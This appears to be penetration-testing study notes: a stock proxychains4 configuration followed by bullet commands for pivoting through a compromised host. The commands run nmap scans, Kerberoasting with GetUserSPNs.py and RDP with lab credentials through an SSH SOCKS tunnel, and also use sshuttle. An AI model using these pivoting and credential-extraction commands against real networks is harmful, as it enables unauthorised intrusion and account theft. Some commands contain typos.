cat /etc/proxychains4.conf

\# proxychains.conf VER 4.x

\#

\# HTTP, SOCKS4a, SOCKS5 tunneling proxifier with DNS.

 

 

\# The option below identifies how the ProxyList is treated.

\# only one option should be uncommented at time,

\# otherwise the last appearing option will be accepted

\#

#dynamic_chain

\#

\# Dynamic - Each connection will be done via chained proxies

\# all proxies chained in the order as they appear in the list

\# at least one proxy must be online to play in chain

\# (dead proxies are skipped)

\# otherwise EINTR is returned to the app

\#

strict_chain

\#

\# Strict - Each connection will be done via chained proxies

\# all proxies chained in the order as they appear in the list

\# all proxies must be online to play in chain

\# otherwise EINTR is returned to the app

\#

#round_robin_chain

\#

\# Round Robin - Each connection will be done via chained proxies

\# of chain_len length

\# all proxies chained in the order as they appear in the list

\# at least one proxy must be online to play in chain

\# (dead proxies are skipped).

\# the start of the current proxy chain is the proxy after the last

\# proxy in the previously invoked proxy chain.

\# if the end of the proxy chain is reached while looking for proxies

\# start at the beginning again.

\# otherwise EINTR is returned to the app

\# These semantics are not guaranteed in a multithreaded environment.

\#

#random_chain

\#

\# Random - Each connection will be done via random proxy

\# (or proxy chain, see chain_len) from the list.

\# this option is good to test your IDS :)

 

\# Make sense only if random_chain or round_robin_chain

#chain_len = 2

 

\# Quiet mode (no output from library)

#quiet_mode

 

\## Proxy DNS requests - no leak for DNS data

\# (disable all of the 3 items below to not proxy your DNS requests)

 

\# method 1. this uses the proxychains4 style method to do remote dns:

\# a thread is spawned that serves DNS requests and hands down an ip

\# assigned from an internal list (via remote_dns_subnet).

\# this is the easiest (setup-wise) and fastest method, however on

\# systems with buggy libcs and very complex software like webbrowsers

\# this might not work and/or cause crashes.

proxy_dns

 

\# method 2. use the old proxyresolv script to proxy DNS requests

\# in proxychains 3.1 style. requires \`proxyresolv\` in \$PATH

\# plus a dynamically linked \`dig\` binary.

\# this is a lot slower than \`proxy_dns\`, doesn\'t support .onion URLs,

\# but might be more compatible with complex software like webbrowsers.

#proxy_dns_old

 

\# method 3. use proxychains4-daemon process to serve remote DNS requests.

\# this is similar to the threaded \`proxy_dns\` method, however it requires

\# that proxychains4-daemon is already running on the specified address.

\# on the plus side it doesn\'t do malloc/threads so it should be quite

\# compatible with complex, async-unsafe software.

\# note that if you don\'t start proxychains4-daemon before using this,

\# the process will simply hang.

#proxy_dns_daemon 127.0.0.1:1053

 

\# set the class A subnet number to use for the internal remote DNS mapping

\# we use the reserved 224.x.x.x range by default,

\# if the proxified app does a DNS request, we will return an IP from that range.

\# on further accesses to this ip we will send the saved DNS name to the proxy.

\# in case some control-freak app checks the returned ip, and denies to

\# connect, you can use another subnet, e.g. 10.x.x.x or 127.x.x.x.

\# of course you should make sure that the proxified app does not need

\# \*real\* access to this subnet.

\# i.e. dont use the same subnet then in the localnet section

#remote_dns_subnet 127

#remote_dns_subnet 10

remote_dns_subnet 224

 

\# Some timeouts in milliseconds

tcp_read_time_out 15000

tcp_connect_time_out 8000

 

\### Examples for localnet exclusion

\## localnet ranges will \*not\* use a proxy to connect.

\## note that localnet works only when plain IP addresses are passed to the app,

\## the hostname resolves via /etc/hosts, or proxy_dns is disabled or proxy_dns_old used.

 

\## Exclude connections to 192.168.1.0/24 with port 80

\# localnet 192.168.1.0:80/255.255.255.0

 

\## Exclude connections to 192.168.100.0/24

\# localnet 192.168.100.0/255.255.255.0

 

\## Exclude connections to ANYwhere with port 80

\# localnet 0.0.0.0:80/0.0.0.0

\# localnet \[::\]:80/0

 

\## RFC6890 Loopback address range

\## if you enable this, you have to make sure remote_dns_subnet is not 127

\## you\'ll need to enable it if you want to use an application that

\## connects to localhost.

\# localnet 127.0.0.0/255.0.0.0

\# localnet ::1/128

 

\## RFC1918 Private Address Ranges

\# localnet 10.0.0.0/255.0.0.0

\# localnet 172.16.0.0/255.240.0.0

\# localnet 192.168.0.0/255.255.0.0

 

\### Examples for dnat

\## Trying to proxy connections to destinations which are dnatted,

\## will result in proxying connections to the new given destinations.

\## Whenever I connect to 1.1.1.1 on port 1234 actually connect to 1.1.1.2 on port 443

\# dnat 1.1.1.1:1234 1.1.1.2:443

 

\## Whenever I connect to 1.1.1.1 on port 443 actually connect to 1.1.1.2 on port 443

\## (no need to write :443 again)

\# dnat 1.1.1.2:443 1.1.1.2

 

\## No matter what port I connect to on 1.1.1.1 port actually connect to 1.1.1.2 on port 443

\# dnat 1.1.1.1 1.1.1.2:443

 

\## Always, instead of connecting to 1.1.1.1, connect to 1.1.1.2

\# dnat 1.1.1.1 1.1.1.2

 

\# ProxyList format

\# type ip port \[user pass\]

\# (values separated by \'tab\' or \'blank\')

\#

\# only numeric ipv4 addresses are valid

\#

\#

\# Examples:

\#

\# socks5 192.168.67.78 1080 lamer secret

\# http 192.168.89.3 8080 justu hidden

\# socks4 192.168.1.49 1080

\# http 192.168.39.93 8080

\#

\#

\# proxy types: http, socks4, socks5, raw

\# \* raw: The traffic is simply forwarded to the proxy without modification.

\# ( auth types supported: \"basic\"-http \"user/pass\"-socks )

\#

\[ProxyList\]

\# add proxy here \...

\# meanwile

\# defaults set to \"tor\"

socks4 127.0.0.1 9050

 

\*very bottom of conf shows socks4 which is loop back and port that proxychains will bind to\*

\*can change port or add second pivot also\*

 

-   Ssh -f -N -D 9050 -I pivot root@10.10.155.5

    -   -f backgrounds ssh

    -   -N no remote commands great for port forward

    -   -D bind port

-   Proxychains nmap -88 10.10.10.225

    -   If you know something is there but it won\'t connect try -sT at the end for TCP connect scan

    -   This is running nmap command through our proxychains setup

-   Proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.225 -request

    -   Kerberoasting through proxychains

-   Proxychains xfreerdp /u:administrator /p:\'Hacker321!\' /v:10.10.10.225

    -   RDP through proxychains

 

-   Proxychains Firefox can run Firefox through proxychains just make sure no Firefox open already

 

 

-   Sshuttle -r root@10.10.155.5 10.10.10.0/24 -ssh=cmd \"ssh -I pivot\"

    -   Sshuttle example command

    -   Can run commands without having to type proxychains everytime just make sure tab with sshuttle running stays open to maintain connection.

 

 

-   Chisel is another tool to consider
